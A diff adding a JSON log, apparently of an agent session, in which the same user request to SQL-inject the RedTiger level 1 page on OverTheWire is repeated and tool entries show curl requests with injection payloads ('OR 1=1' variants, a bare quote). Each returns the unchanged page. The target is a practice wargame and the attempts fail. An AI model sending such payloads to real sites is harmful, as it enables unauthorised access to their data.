@@ -1,0 +1,30 @@
+[
+    {
+        "role": "user",
+        "content": "do an sql injection a this url http://redtiger.labs.overthewire.org/level1.php using curl to build the request"
+    },
+    {
+        "role": "tool",
+        "content": "curl -X POST -d \"username=' OR '1'='1&password=test\" http://redtiger.labs.overthewire.org/level1.php output : <b>Welcome to level 1</b>\n<br><br>\nLets start with a simple injection.\n<br><br>\nTarget: Get the login for the user Hornoxe\n<br>\nHint: You really need one? omg -_-\n<br>\nTablename: level1_users\n<br><br><br>\n\n<br>Category: <a href=\"?cat=1\">1</a><br><br>This category does not exist! <br>\n\t\t\t<br><br><br>\n\t\t\t<form method=\"post\">\n\t\t\t\tUsername: <input type=\"text\" name=\"user\"><br>\n\t\t\t\tPassword: <input type=\"text\" name=\"password\">\n\t\t\t\t<input type=\"submit\" name=\"login\" value=\"Login\">\n\t\t\t</form>\n\t\t\t<br>\n\t\t"
+    },
+    {
+        "role": "user",
+        "content": "do an sql injection a this url http://redtiger.labs.overthewire.org/level1.php using curl to build the request"
+    },
+    {
+        "role": "tool",
+        "content": "curl -s -D - \"http://redtiger.labs.overthewire.org/level1.php?id=1\\'+OR+1\\%3D1--+-\" output : HTTP/1.1 200 OK\nDate: Sun, 28 Jul 2024 19:19:35 GMT\nServer: Apache\nVary: Accept-Encoding\nContent-Length: 499\nContent-Type: text/html; charset=UTF-8\n\n<b>Welcome to level 1</b>\n<br><br>\nLets start with a simple injection.\n<br><br>\nTarget: Get the login for the user Hornoxe\n<br>\nHint: You really need one? omg -_-\n<br>\nTablename: level1_users\n<br><br><br>\n\n<br>Category: <a href=\"?cat=1\">1</a><br><br>This category does not exist! <br>\n\t\t\t<br><br><br>\n\t\t\t<form method=\"post\">\n\t\t\t\tUsername: <input type=\"text\" name=\"user\"><br>\n\t\t\t\tPassword: <input type=\"text\" name=\"password\">\n\t\t\t\t<input type=\"submit\" name=\"login\" value=\"Login\">\n\t\t\t</form>\n\t\t\t<br>\n\t\t"
+    },
+    {
+        "role": "user",
+        "content": "do an sql injection a this url http://redtiger.labs.overthewire.org/level1.php using curl to build the request"
+    },
+    {
+        "role": "tool",
+        "content": "curl -s -D - \"http://redtiger.labs.overthewire.org/level1.php?id=1%27\" output : HTTP/1.1 200 OK\nDate: Sun, 28 Jul 2024 19:19:47 GMT\nServer: Apache\nVary: Accept-Encoding\nContent-Length: 499\nContent-Type: text/html; charset=UTF-8\n\n<b>Welcome to level 1</b>\n<br><br>\nLets start with a simple injection.\n<br><br>\nTarget: Get the login for the user Hornoxe\n<br>\nHint: You really need one? omg -_-\n<br>\nTablename: level1_users\n<br><br><br>\n\n<br>Category: <a href=\"?cat=1\">1</a><br><br>This category does not exist! <br>\n\t\t\t<br><br><br>\n\t\t\t<form method=\"post\">\n\t\t\t\tUsername: <input type=\"text\" name=\"user\"><br>\n\t\t\t\tPassword: <input type=\"text\" name=\"password\">\n\t\t\t\t<input type=\"submit\" name=\"login\" value=\"Login\">\n\t\t\t</form>\n\t\t\t<br>\n\t\t"
+    },
+    {
+        "role": "user",
+        "content": "do an sql injection a this url http://redtiger.labs.overthewire.org/level1.php using curl to build the request"
+    }
+]
